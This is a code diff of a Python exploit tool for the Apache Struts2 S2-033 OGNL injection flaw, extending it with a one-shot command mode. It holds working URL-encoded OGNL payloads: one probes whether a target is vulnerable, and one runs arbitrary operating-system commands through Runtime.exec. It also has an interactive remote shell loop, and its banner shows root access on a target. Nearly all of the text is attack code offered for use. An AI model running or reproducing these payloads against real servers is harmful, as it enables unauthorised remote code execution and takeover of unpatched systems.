@@ -15,20 +15,29 @@ banner = u'''\
   2、交互式执行命令
     python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -shell yes
 # ~$ id
-# ========================================
+# ======================================================
 # uid=0(root) gid=0(root) groups=0(root)
 #
-# ========================================
+# ======================================================
 # ~$ pwd
-# ========================================
+# ======================================================
 # /
-#========================================
+# ======================================================
 # ~$ q   退出
 
-# ========================================
+# ======================================================
 '''
+# PoC
+s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
+# CommandExP
+cmd_exp = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=ShowMeCommand"
+headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
+            'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
+            'referer': 'http://www.baidu.com/',
+}
+
 def verity(url):
-    s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
+
     try:
         poc_url = url+s2033_poc
         print "."*len(url)
@@ -47,51 +56,75 @@ def verity(url):
 
 
 def cmdTool(exp_url):
-    cmd_exp = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=ShowMeCommand"
+
     get_url_exp = exp_url + cmd_exp
     while True:
         comm = raw_input("~$ ")
         if comm == "q":
             exit(0)
-        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
-                    'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
-                    'referer': exp_url,
-                    }
         temp_exp = get_url_exp.replace("ShowMeCommand", comm)
         try:
-            print "="*40
+            print "="*80
+            print "[Result]"
+            print "_"*80
             r = requests.get(temp_exp, headers=headers, timeout=5)
             resp = r.text.encode("utf-8")
             print resp
-            print "="*40
+            print "="*80
         except:
             print "error,try again.."
-parser = argparse.ArgumentParser()
-parser.add_argument('-u', help='the target url.', required=True)
-parser.add_argument('-shell', help='get os shell (yes|no)', required=False)
-parser.add_argument('-check', help='yes|no', required=False)
-args = parser.parse_args()
-args_dict = args.__dict__
 
-try:
-    print banner
-    if not (args_dict['u'] == None):
-        if not (args_dict['check'] == None):
-            url = args_dict['u']
-            if args_dict['check'] == "yes":
-                isvuln = verity(url)
-                if isvuln:
-                    print "{url} is vulnerable S2-033.".format(url=url)
-                    exit(0)
-                else:
-                    print "{url} is no vulnerable..".format(url=url)
-                    exit(0)
-        if not (args_dict['shell'] == None):
-            if args_dict['shell'] == "yes":
+# 执行一句话命令
+def ExecOneCmd(exp_url , command):
+    try:
+        get_url_exp = exp_url + cmd_exp
+        temp_exp = get_url_exp.replace("ShowMeCommand", command)
+        print "="*80
+        print "[Result]"
+        print "_"*80
+        r = requests.get(temp_exp, headers=headers, timeout=5)
+        resp = r.text.encode("utf-8")
+        print resp
+        print "="*80
+        return True
+    except:
+        return False
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', help='the target url.', required=True)
+    parser.add_argument('-check', help='yes|no', required=False)
+    parser.add_argument('-shell', help='get os shell (yes|no)', required=False)
+    parser.add_argument('-command', help='yes|no', required=False)
+    args = parser.parse_args()
+    args_dict = args.__dict__
+
+    try:
+        print banner
+        if not (args_dict['u'] == None):
+            if not (args_dict['check'] == None):
                 url = args_dict['u']
-                cmdTool(url)
-            exit(0)
-    print parser.print_usage()
-except Exception,e:
-    print parser.print_usage()
-    exit(-1)
+                if args_dict['check'] == "yes":
+                    isvuln = verity(url)
+                    if isvuln:
+                        print "{url} is vulnerable S2-033.".format(url=url)
+                        exit(0)
+                    else:
+                        print "{url} is no vulnerable..".format(url=url)
+                        exit(0)
+            if not (args_dict['shell'] == None):
+                if args_dict['shell'] == "yes":
+                    url = args_dict['u']
+                    cmdTool(url)
+                exit(0)
+
+            if not (args_dict['command'] == None):
+                url = args_dict['u']
+                command = args_dict['command']
+                ExecOneCmd(url, command)
+                exit(0)
+
+        print parser.print_usage()
+    except Exception,e:
+        print parser.print_usage()
+        exit(-1)
